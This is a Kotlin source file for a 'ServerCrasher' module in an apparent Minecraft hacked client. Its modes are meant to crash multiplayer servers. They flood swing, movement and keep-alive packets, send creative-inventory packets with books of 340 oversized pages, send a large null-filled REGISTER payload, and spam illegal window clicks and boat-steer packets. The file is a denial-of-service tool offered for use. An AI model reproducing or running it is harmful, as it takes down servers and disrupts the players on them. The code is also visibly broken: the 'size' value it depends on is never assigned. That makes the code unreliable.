package me.jiyun233.nya.module.modules.exploits

import io.netty.buffer.Unpooled
import me.jiyun233.nya.event.events.player.UpdateWalkingPlayerEvent
import me.jiyun233.nya.module.Category
import me.jiyun233.nya.module.Module
import me.jiyun233.nya.module.ModuleInfo
import net.minecraft.entity.item.EntityBoat
import net.minecraft.init.Items
import net.minecraft.inventory.ClickType
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.*
import net.minecraft.util.EnumFacing
import net.minecraft.util.EnumHand
import net.minecraft.util.math.BlockPos
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent
import net.minecraftforge.fml.common.network.FMLNetworkEvent
import kotlin.concurrent.thread

@ModuleInfo(name = "ServerCrasher", descriptions = "Crash server right now", category = Category.EXPLOITS)
object ServerCrasher : Module() {
    private val packets = registerSetting("PacketCount", 200, 0, 400)
    private val mode = registerSetting("Mode", Mode.Nearby)
    private var speed = registerSetting("Boat Amount", 500, 1, 5000).modeVisible(mode, Mode.BoatSteer)

    internal enum class Mode {
        Swing, Nearby, ClickCrash, InvalidPackets, RegisterPackets, IllegalWindowClick, BoatSteer
    }

    private var buffer: PacketBuffer? = null

    @SubscribeEvent
    fun onDisconnect(event: FMLNetworkEvent.ClientDisconnectionFromServerEvent) {
        disable()
    }

    override fun onEnable() {

        if (mode.value == Mode.ClickCrash || mode.value == Mode.InvalidPackets) {
            val size =


            val bookStack = ItemStack(Items.WRITABLE_BOOK)
            val author = "Netty$size"

            val bookCompound = NBTTagCompound()
            val pageList = NBTTagList()
            for (i3 in 0..339) {
                val tString = NBTTagString(size)
                pageList.appendTag(tString)
            }
            bookCompound.setString("author", author)
            bookCompound.setString("title", size)
            bookCompound.setTag("pages", pageList)

            bookStack.tagCompound?.setTag("pages", pageList) ?: bookStack.setTagInfo("pages", pageList)

            if (mode.value == Mode.ClickCrash) {
                for (i in 0..packets.value) {
                    mc.connection?.sendPacket(
                        CPacketPlayerTryUseItemOnBlock(
                            BlockPos(
                                mc.player.posX,
                                mc.player.posY - 2.0,
                                mc.player.posZ
                            ), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0f, 0.0f, 0.0f
                        )
                    )
                }
            } else if (mode.value == Mode.InvalidPackets) {
                thread {
                    for (i in 0..packets.value) {
                        while (mc?.connection?.networkManager?.isChannelOpen == true) {
                            mc.connection?.sendPacket(CPacketCreativeInventoryAction(100, bookStack))
                            try {
                                Thread.sleep(10L)
                            } catch (e: InterruptedException) {
                                e.printStackTrace()
                            }
                        }
                    }
                }
            }
        }

    }

    private var register = true

    override fun onUpdate() {
        when (mode.value) {
            Mode.RegisterPackets -> {
                if (buffer == null) {
                    buffer = PacketBuffer(Unpooled.buffer())
                    for (i in 0 until 32767 / 4) buffer!!.writeByte('\u0000'.code)
                }
                mc.connection?.sendPacket(CPacketCustomPayload("REGISTER", buffer!!))
                register = false
            }

            Mode.IllegalWindowClick -> {
                repeat(1000) {
                    val packet = CPacketClickWindow(0,
                        69,
                        1,
                        ClickType.QUICK_MOVE,
                        ItemStack(mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem())
                        , 1.toShort())
                    mc.player.connection.sendPacket(packet)
                }
            }

            Mode.BoatSteer -> {
                if (mc.player.ridingEntity is EntityBoat) {
                    for (i in 0 until speed.value) mc.player.connection.sendPacket(CPacketSteerBoat(true, true))
                }
            }
        }
    }

    @SubscribeEvent
    fun onMotionUpdate(event: UpdateWalkingPlayerEvent) {

        if (fullNullCheck()) return

        when (mode.value) {
            Mode.Nearby -> {
                if (mode.value == Mode.Nearby) {
                    if (mc.world.getEntitiesWithinAABBExcludingEntity(
                            mc.player,
                            mc.player.entityBoundingBox
                        ).isNotEmpty()
                    ) {
                        repeat(packets.value) {
                            mc.connection?.sendPacket(CPacketPlayer(Math.random() >= 0.5))
                            mc.connection?.sendPacket(CPacketKeepAlive((Math.random() * 8).toLong()))
                        }
                    }
                }
            }

            Mode.Swing -> {
                var i = 0
                while (i < packets.value) {
                    mc.connection?.sendPacket(CPacketAnimation(EnumHand.MAIN_HAND))
                    i++
                }
            }
        }
    }

}